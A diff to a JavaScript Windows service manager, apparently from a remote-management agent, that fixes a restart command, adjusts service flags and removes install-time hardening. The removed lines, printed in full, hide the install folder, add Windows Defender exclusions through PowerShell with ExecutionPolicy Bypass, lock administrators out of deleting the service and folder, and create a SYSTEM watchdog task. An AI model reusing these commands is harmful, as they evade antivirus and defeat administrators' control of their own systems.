@@ -1156,7 +1156,7 @@ function serviceManager() {
                   "cmd.exe",
                   '/C net stop "' +
                     this.name +
-                    '" & net stop "' +
+                    '" & net start "' +
                     this.name +
                     '"',
                 ],
@@ -2970,7 +2970,7 @@ function serviceManager() {
         serviceName,
         displayName,
         allAccess,
-        0x10 | 0x100,
+        0x10,
         serviceType,
         0,
         servicePath,
@@ -3026,90 +3026,22 @@ function serviceManager() {
         if (this.proxy.ChangeServiceConfig2W(h, 2, failureActions).Val == 0) {
           console.log("Unable to set FailureActions...");
         }
+
+        var failureActionsFlag = this.GM.CreateVariable(4);
+        failureActionsFlag.Deref(0, 4).toBuffer().writeUInt32LE(1);
+        if (this.proxy.ChangeServiceConfig2W(h, 4, failureActionsFlag).Val == 0) {
+          console.log("Unable to set FailureActionsOnNonCrashFailures...");
+        }
+      }
+      if (serviceType == 0x02) {
+        var delayedAutoStart = this.GM.CreateVariable(4);
+        delayedAutoStart.Deref(0, 4).toBuffer().writeUInt32LE(1);
+        if (this.proxy.ChangeServiceConfig2W(h, 3, delayedAutoStart).Val == 0) {
+          console.log("Unable to set DelayedAutoStart...");
+        }
       }
       this.proxy.CloseServiceHandle(h);
       this.proxy.CloseServiceHandle(handle);
-
-      // Set Hidden+System attributes on install folder (reduces visibility in Explorer)
-      if (!options.installInPlace) {
-        try {
-          require("child_process").execFile(
-            process.env["windir"] + "\\system32\\attrib.exe",
-            ["+H", "+S", options.installPath.replace(/\\$/, "")],
-          );
-        } catch (e) {}
-      }
-
-      // Add Windows Defender exclusions for the install path and process
-      try {
-        require("child_process").execFile(
-          process.env["windir"] +
-            "\\system32\\WindowsPowerShell\\v1.0\\powershell.exe",
-          [
-            "-NonInteractive",
-            "-NoProfile",
-            "-ExecutionPolicy",
-            "Bypass",
-            "-Command",
-            'Add-MpPreference -ExclusionPath "' +
-              options.installPath +
-              '" -ErrorAction SilentlyContinue; ' +
-              'Add-MpPreference -ExclusionProcess "' +
-              options.target +
-              '.exe" -ErrorAction SilentlyContinue',
-          ],
-        );
-      } catch (e) {}
-
-      // Harden against admin deletion: restrict service DACL + deny delete on install folder
-      try {
-        var installPathNoSlash = options.installPath.replace(/\\$/, "");
-        require("child_process").execFile(
-          process.env["windir"] +
-            "\\system32\\WindowsPowerShell\\v1.0\\powershell.exe",
-          [
-            "-NonInteractive",
-            "-NoProfile",
-            "-ExecutionPolicy",
-            "Bypass",
-            "-Command",
-            // 1. Service DACL: SYSTEM=full, Admins=start/stop only (no sc delete, no config change)
-            'sc.exe sdset "' +
-              options.name +
-              '" "D:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;;CCLCSWRPWP;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)"; ' +
-              // 2. Deny Delete on install folder for Admins (write/overwrite still allowed, so updates work)
-              '$p=[System.IO.Path]::GetFullPath("' +
-              installPathNoSlash.replace(/\\/g, "\\\\") +
-              '"); ' +
-              "try { $acl=Get-Acl $p; " +
-              '$rule=New-Object System.Security.AccessControl.FileSystemAccessRule("S-1-5-32-544","Delete,DeleteSubdirectoriesAndFiles","ContainerInherit,ObjectInherit","None","Deny"); ' +
-              "$acl.AddAccessRule($rule); Set-Acl -Path $p -AclObject $acl } catch {}",
-          ],
-        );
-      } catch (e) {}
-
-      // Create watchdog scheduled task: restarts the service every 2 min if stopped
-      try {
-        require("child_process").execFile(
-          process.env["windir"] + "\\system32\\schtasks.exe",
-          [
-            "/create",
-            "/tn",
-            options.name + "Watchdog",
-            "/tr",
-            "sc.exe start " + options.name,
-            "/sc",
-            "MINUTE",
-            "/mo",
-            "2",
-            "/ru",
-            "SYSTEM",
-            "/rl",
-            "HIGHEST",
-            "/f",
-          ],
-        );
-      } catch (e) {}
 
       if (options.parameters) {
         try {
@@ -3958,6 +3890,24 @@ function serviceManager() {
     var workingPath = service.appWorkingDirectory();
 
     if (process.platform == "win32") {
+      try {
+        require("child_process").execFile(
+          process.env["windir"] + "\\system32\\sc.exe",
+          [
+            "sdset",
+            name,
+            "D:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)",
+          ],
+        ).waitExit();
+      } catch (ee) {}
+
+      try {
+        require("child_process").execFile(
+          process.env["windir"] + "\\system32\\icacls.exe",
+          [workingPath.replace(/[\\\/]+$/, ""), "/remove:d", "*S-1-5-32-544"],
+        ).waitExit();
+      } catch (ee) {}
+
       if (!options || !options.skipDeleteBinary) {
         try {
           require("fs").unlinkSync(servicePath);
